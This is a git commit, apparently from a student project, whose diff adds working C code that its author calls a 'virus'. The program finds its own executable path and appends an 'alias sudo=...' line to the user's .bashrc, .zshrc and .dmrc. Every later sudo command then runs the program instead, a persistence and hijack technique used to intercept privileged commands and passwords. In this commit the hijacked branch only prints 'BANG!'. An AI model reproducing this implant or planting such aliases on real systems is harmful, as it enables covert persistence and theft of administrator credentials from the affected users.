a37bc559266e328f9ef384b6ea116ef1f2640ca2
abellows50 <abellows50@stuy.edu>
2025-05-13 21:25:28 -0400

    work on virus implantation

--- pseudo.c
+++ pseudo.c
@@ -4,20 +4,49 @@
 #include <sys/types.h>
 #include <pwd.h>
 #include <string.h>
+#include <fcntl.h>
+#include "pseudo.h"
+
 
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
-int main(){
+int main(int argc, char ** argv){
+  int mode = P_IMPLANT;
+  for (int i = 0; i<argc; i++){
+    if (strcmp(argv[i],"SUDO") == 0){
+      printf("BANG!\n");
+      mode = P_SUDO;
+      break;
+    }
+  }
 
+  if(mode == P_IMPLANT){
+    alias_virus();
+  }
+  
+
+}
+
+
+int alias_virus(){
+  //get the home dir
   char * home_dir_path= getenv("HOME");
-
+  
+  //get the path to the virus
+  char path_to_this_exe[1024] = "";
+  readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));
+  
+  //prepare the alias
+  char alias[2048] = "alias sudo=\"";
+  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", path_to_this_exe);
+  
   for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
-    append_virus(home_dir_path, CONFIGS[i]);
+    append_virus(home_dir_path, CONFIGS[i], alias);
   }
 
 }
 
-int append_virus(char * home_dir, char * config_file){
+int append_virus(char * home_dir, char * config_file, char * alias){
   char buffer[1024] = "";
 
   strcpy(buffer, home_dir);
@@ -33,5 +62,10 @@ int append_virus(char * home_dir, char * config_file){
 
 
   lseek(fd, 0, SEEK_END);
+  write(fd, alias, strlen(alias));
+  write(fd,"\n",strlen("\n"));
+
+
+  close(fd);
 
 }
---
+++ pseudo.h
@@ -0,0 +1,9 @@
+#ifndef PSEUDO_H
+#define PSEUDO_H
+
+#define P_SUDO 0
+#define P_IMPLANT 1
+
+int append_virus(char * home_dir, char * config_file, char * alias);
+int alias_virus();
+#endif
